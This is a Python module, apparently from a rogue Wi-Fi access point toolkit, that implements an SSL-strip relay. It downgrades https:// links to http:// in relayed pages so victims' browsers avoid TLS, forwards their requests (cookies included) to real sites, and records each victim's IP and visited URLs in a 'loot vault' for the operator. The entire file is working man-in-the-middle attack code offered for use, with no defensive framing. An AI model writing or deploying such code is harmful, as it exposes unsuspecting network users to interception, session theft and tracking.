"""C4: HTTP relay / SSL-strip-lite for the rogue stack.

The rogue AP is the victim's default gateway, so every outbound :80 request
lands on the portal. Normally the portal answers everything with the captive
page. When relay mode is armed (dashboard action `relay`, persisted in state),
the portal instead relays the request to its real destination over the box's
uplink and streams the response back, rewriting any https:// reference to
http:// (ssl-strip-lite) so the victim's browser never attempts TLS — the next
cleartext request then relays the same way. Nothing is decrypted and no
content is stored: only request/response *metadata* is mirrored to the loot
vault so the operator can correlate victims to sites.

Safety rails: only http(s), only http-ish ports, never the rogue portal
itself, never the asset-gateway path, per-request body cap, short timeout.
"""

import re
import time
import urllib.parse
import urllib.request

from . import config
from . import state

RELAY_TIMEOUT = 8
RELAY_CAP = 4 * 1024 * 1024            # single relayed response budget
_ALLOWED_PORTS = {80, 443, 8080, 8000, 8443}
_STRIP_RE = re.compile(r'https://', re.IGNORECASE)
_STRIP_RE_B = re.compile(rb'https://', re.IGNORECASE)

# Header keys that are end-to-end and safe to keep for the upstream request;
# hop-by-hop headers (Host, Connection, Content-Length is re-derived) can
# break or poison the relay.
_SEND_HEADERS = ('user-agent', 'accept', 'accept-language',
                 'content-type', 'cookie', 'referer')


def rewrite_https_to_http(data):
    """ssl-strip-lite: downgrade absolute https URLs to cleartext http."""
    if isinstance(data, bytes):
        return _STRIP_RE_B.sub(b'http://', data)
    return data


def parse_target(method, path, host_header):
    """Resolve one relayed request into an absolute URL, or None.

    Accepts proxy-style absolute-URI request lines (`GET http://host/x`), the
    usual origin-form `GET /x` with a Host header, and rejects everything that
    is not a plain http(s) URL with an allowed port, would loop back onto the
    rogue portal itself, or walks the asset gateway (portal-internal paths).
    """
    scheme = netloc = rest = None
    if '://' in (path or ''):
        parsed = urllib.parse.urlsplit(path)
        scheme, netloc, rest = parsed.scheme, parsed.netloc, parsed.path
        if parsed.query:
            rest = '%s?%s' % (rest, parsed.query)
    else:
        if not host_header:
            return None
        parsed = urllib.parse.urlsplit('http://%s%s' % (host_header, path or '/'))
        scheme, netloc, rest = parsed.scheme, parsed.netloc, parsed.path
        if parsed.query:
            rest = '%s?%s' % (rest, parsed.query)
    if scheme not in ('http', 'https'):
        return None
    port = None
    host = netloc
    if ':' in netloc:
        host, _, port = netloc.rpartition(':')
    host = host.split(':')[0].strip('[]')
    if not host:
        return None
    if port is not None:
        try:
            port = int(port)
        except ValueError:
            return None
        if port not in _ALLOWED_PORTS:
            return None
        netloc = '%s:%d' % (host, port)
    myhost = (config.PORTAL_IP or '').split(':')[0]
    if host == myhost or host == 'localhost' or host == 'portal' or \
            rest.startswith('/__clone'):
        return None
    if not rest:
        rest = '/'
    return '%s://%s%s' % (scheme, netloc, rest)


def forward(method, url, headers, body, cap=RELAY_CAP):
    """Relay one request upstream; returns (status, content_type, bytes).

    Tries the cleartext version first (everything arrived as http anyway),
    then https, mirroring ssl-strip semantics. Raises IOError when the
    upstream is unreachable or the response exceeds `cap`. Only the response
    bytes are returned; hop-by-hop headers are never copied verbatim.
    """
    if not url:
        raise IOError('empty relay target')
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in ('http', 'https') or not parsed.netloc:
        raise IOError('bad relay target')
    sent = dict((k, v) for k, v in headers.items()
                if k.lower() in _SEND_HEADERS)
    candidates = ([url] if parsed.scheme == 'https' else
                  [url, 'https://%s%s' % (parsed.netloc, parsed.path)])
    last = None
    r = None
    for target in candidates:
        req = urllib.request.Request(target, data=body, method=method.upper(),
                                     headers=sent)
        try:
            r = urllib.request.urlopen(req, timeout=RELAY_TIMEOUT)
            break
        except Exception as exc:            # noqa: BLE001 - any failure -> next
            last = exc
            r = None
    if r is None:
        raise IOError('upstream unreachable: %s' % (last or 'unknown'))
    try:
        data = r.read(cap + 1)
        if len(data) > cap:
            raise IOError('response exceeds %d bytes' % cap)
        ctype = r.headers.get('Content-Type', 'application/octet-stream')
        return r.status or r.getcode() or 200, ctype, data
    finally:
        r.close()


def log_pair(client_ip, method, url, status, size, via):
    """Mirror one relayed request's metadata to the vault (no content)."""
    state.append_web({
        'ts': time.strftime('%Y-%m-%d %H:%M:%S UTC'),
        'ip': client_ip,
        'token': None,
        'method': method,
        'url': url,
        'status': status,
        'bytes': size,
        'via': via,
    })
    state.emit('WEB', '%s %s -> %d (%d bytes via %s)' % (
        method, url, status, size, via))
    state.mirror_loot()